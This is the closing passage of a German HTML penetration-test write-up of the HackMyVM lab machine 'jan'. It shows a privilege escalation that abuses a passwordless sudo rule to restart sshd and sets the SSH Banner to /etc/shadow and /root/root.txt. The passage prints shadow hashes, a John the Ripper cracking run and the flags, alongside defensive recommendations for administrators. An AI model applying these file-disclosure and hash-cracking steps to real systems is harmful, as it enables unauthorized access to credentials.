+                     <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo /sbin/service sshd restart</span></div>
+                     <pre>
+ * Stopping sshd ...                                                                    [ ok ]
+ * Starting sshd ...                                                                    [ ok ]
+jan:~$ # (Verbindung wird geschlossen)
+                     </pre>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh ssh@192.168.2.170</span></div>
+                     <pre>
+#DIRTYCTFLOLBUTPAZZNOTNEEDED <<=== :) kein BruteForce nötig
+
+root:$6$QBMHIEgcztCuLI0w$6mEXyvVKjT3gW8r0Ck99QElCdHdi32m6fzCkwv613kbqBVqt9FttRbcGXhf9Eg6q0PKj6FuvZr2QmupOLzG/e1:20116:0:::::
+bin:!::0:::::
+# ... (restliche /etc/shadow Einträge) ...
+ssh:<span class="password">$6$X9w2fIhun4erCQ0g$sX6uU920JjNVy70vsILZIV5CA83BZhm0FT7HofU4PPqu/oLI69K.nN/14v4vmmwv62jwUwdaw0BOR3qICICDV/</span>:20116:0:99999:7:::
+ssh@192.168.2.170's password: # (Login kann hier abgebrochen werden)
+# (Kommentar im Text: Super Erfolg!!!!)
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `Banner`-Direktive wird nun auf `/etc/shadow` gesetzt, der SSH-Dienst neu gestartet und ein neuer Login-Versuch unternommen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Der Inhalt von `/etc/shadow`, einschließlich des Passwort-Hashes für den Benutzer `ssh`, wird im Banner angezeigt. Dies bestätigt die Ausnutzbarkeit der `sudo`-Regel in Kombination mit der Banner-Funktion zum Auslesen von Dateien.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hash des `ssh`-Benutzers extrahieren und versuchen, ihn offline zu knacken (wie im nächsten Schritt gezeigt). Den endgültigen Exploit mit `/root/root.txt` als Banner durchführen.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel korrigieren. SSH-Konfiguration schützen. Banner-Funktion überdenken.</p>
+
+            <h3>Offline Hash Cracking Versuch (John)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div> <!-- Annahme: "hash" ist eine Datei mit dem extrahierten Hash -->
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:24 13.86% (ETA: 22:59:33) 0g/s 25965p/s 25965c/s 25965C/s 91nuthouse69..91031112902
+Session aborted
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `john` (John the Ripper) wird verwendet, um den extrahierten SHA512crypt-Hash (`$6$`) des `ssh`-Benutzers mit der `rockyou.txt`-Wortliste zu knacken.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Cracking-Versuch wird nach kurzer Zeit abgebrochen (`Session aborted`). Das Passwort `EazyLOL` befindet sich nicht am Anfang der `rockyou.txt` oder wurde nicht schnell genug gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Längere Cracking-Zeit einplanen oder stärkere GPUs/CPUs verwenden. Da das Passwort bereits durch die `/credz`-Schwachstelle bekannt ist, ist dieser Schritt hier eigentlich redundant.<br><strong>Empfehlung (Admin):</strong> Starke, nicht in Wörterbüchern enthaltene Passwörter verwenden.</p>
+
+            <h3>Manipulation der SSH-Konfiguration (Versuch 3: /root/root.txt - Final)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt alpine-prompt">jan:~$ <span class="command">nano /etc/ssh/sshd_config</span></div>
+                      <pre>
+#-----------------------------------------------------------------
+# Relevant snippet after change:
+PermitRootLogin yes
+#-----------------------------------------------------------------
+# ...
+# Banner /etc/shadow (previous setting)
+# ÄNDERN ZU:
+Banner /root/root.txt
+#-----------------------------------------------------------------
+                      </pre>
+                      <div class="prompt alpine-prompt">jan:~$ <span class="command">grep -Ei "PermitRootLogin" /etc/ssh/sshd_config</span></div>
+                      <pre>PermitRootLogin yes</pre>
+                      <!-- Redundante sudo -l Ausgabe -->
+                      <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+User ssh may run the following commands on jan:
+    (root) NOPASSWD: /sbin/service sshd restart
+                      </pre>
+                       <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo /sbin/service sshd restart</span></div>
+                       <pre>
+ * Stopping sshd ...                                                                    [ ok ]
+ * Starting sshd ...                                                                    [ ok ]
+jan:~$ # (Verbindung wird geschlossen)
+                       </pre>
+                  </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Die SSH-Konfiguration wird erneut bearbeitet. Diesmal wird die `Banner`-Direktive auf `/root/root.txt` gesetzt. `PermitRootLogin yes` wird ebenfalls überprüft (war aber für diesen Exploit nicht relevant). Der SSH-Dienst wird mit `sudo` neu gestartet.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Dies ist der finale Schritt der Privilege Escalation. Durch den Neustart wird die Konfiguration aktiv, die die Root-Flag als Banner anzeigt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erneut per SSH verbinden, um den Banner (die Root-Flag) zu sehen.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur Absicherung von `sudo` und SSH.</p>
+
+            <h3>Root Flag Erhalt</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh ssh@192.168.2.170</span></div>
+                     <pre>
+<span class="password">HMV2PRMTERWTFUDNGMBG</span>
+ssh@192.168.2.170's password: # (Login kann hier abgebrochen werden)
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneuter SSH-Login-Versuch.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Die Root-Flag `HMV2PRMTERWTFUDNGMBG` wird als SSH-Banner angezeigt. Privilege Escalation abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag notieren. Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> System sichern!</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/ssh/user.txt</div> <!-- Pfad aus ls -la übernommen -->
+                    <div class="flag-value"><span class="password">HMVSSWYMCNFIBDAFMTHFK</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt (via SSH Banner)</div>
+                    <div class="flag-value"><span class="password">HMV2PRMTERWTFUDNGMBG</span></div>
+                </div>
+            </div>
+        </section>
+
+         <section id="zusammenfassung-empfehlungen">
+            <h2>Zusammenfassung & Empfehlungen</h2>
+             <p class="evaluation"><strong>Zusammenfassende Bewertung der Sicherheitslage:</strong> Das System "jan.hmv" weist kritische Schwachstellen auf, die zu einem initialen Zugriff über schwache/entdeckte Credentials und anschließend zu einer vollständigen Rechteausweitung führten. Die Hauptschwachstellen waren eine unsichere Webanwendung (Parameter-Parsing-Fehler in `/redirect`, der den Zugriff auf interne Ressourcen wie `/credz` ermöglichte) und eine unsichere `sudo`-Konfiguration, die das Auslesen beliebiger Dateien über die SSH-Banner-Funktion erlaubte.</p>
+
+             <h3>Identifizierte Verletzlichkeiten (Zusammenfassung):</h3>
+             <ul>
+                 <li>**Web (HTTP-Proxy/Anwendung auf 8080):** Unsichere Parameterverarbeitung im `/redirect`-Endpunkt ermöglichte den Zugriff auf den internen `/credz`-Endpunkt durch Übergabe doppelter `url`-Parameter.</li>
+                 <li>**Web (HTTP-Proxy/Anwendung auf 8080):** Der `/credz`-Endpunkt enthielt Klartext-Zugangsdaten (`ssh`/`EazyLOL`).</li>
+                 <li>**Web (Allgemein):** Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`). Vorhandensein potenziell sensibler Backup-Dateien im Web-Root.</li>
+                 <li>**System (sudo):** Unsichere Konfiguration erlaubt dem Benutzer `ssh` das Neustarten des SSH-Dienstes als root ohne Passwort.</li>
+                 <li>**System (SSH):** Die `Banner`-Funktion in `sshd_config` konnte missbraucht werden, um beliebige, für root lesbare Dateien auszulesen, wenn der Dienst mit `sudo` neu gestartet wurde.</li>
+             </ul>
+
+             <h3>Allgemeine Empfehlungen:</h3>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong>
+                 <ol>
+                     <li><strong>Webanwendung (Port 8080):</strong>
+                         <ul>
+                             <li>Die Parameterverarbeitung für `/redirect` korrigieren, um doppelte Parameter oder unerwartete Eingaben sicher zu handhaben.</li>
+                             <li>Eine robuste Whitelist für erlaubte Ziel-URLs in `/redirect` implementieren und Zugriffe auf interne Ressourcen oder `file://` blockieren.</li>
+                             <li>Den Endpunkt `/credz` entfernen oder mit starker Authentifizierung/Autorisierung schützen. Zugangsdaten niemals in Klartext speichern oder über Web-Endpunkte verfügbar machen.</li>
+                             <li>Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`, etc.) implementieren.</li>
+                             <li>Gefundene Backup-Dateien aus dem Web-Verzeichnis entfernen und sicherstellen, dass keine Backups in öffentlich zugängliche Bereiche geschrieben werden.</li>
+                         </ul>
+                     </li>
+                     <li><strong>System & SSH:</strong>
+                         <ul>
+                             <li>Die `sudo`-Regel für den Benutzer `ssh` entfernen oder so einschränken, dass der SSH-Dienst nicht mehr als root neu gestartet werden kann.</li>
+                             <li>Sicherstellen, dass die SSH-Konfigurationsdatei `/etc/ssh/sshd_config` nur für `root` schreibbar ist.</li>
+                             <li>SSH-Zugriff generell härten: Starke Passwörter oder (besser) Key-basierte Authentifizierung erzwingen. `Fail2ban` oder ähnliche Tools zur Abwehr von Brute-Force-Angriffen einsetzen.</li>
+                             <li>Die Verwendung der SSH-Banner-Funktion überdenken und deaktivieren, wenn sie nicht zwingend benötigt wird.</li>
+                         </ul>
+                     </li>
+                     <li><strong>Allgemeine Sicherheitspraktiken:</strong>
+                         <ul>
+                             <li>Regelmäßige Sicherheitsüberprüfungen und Penetrationstests durchführen.</li>
+                             <li>System und alle Komponenten aktuell halten (Patches).</li>
+                             <li>Logging und Monitoring von System- und Anwendungsereignissen implementieren.</li>
+                         </ul>
+                     </li>
+                 </ol>
+              </p>
+ 
+
+        </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2025-01-30</p>
+    </footer>
+</body>
+</html>
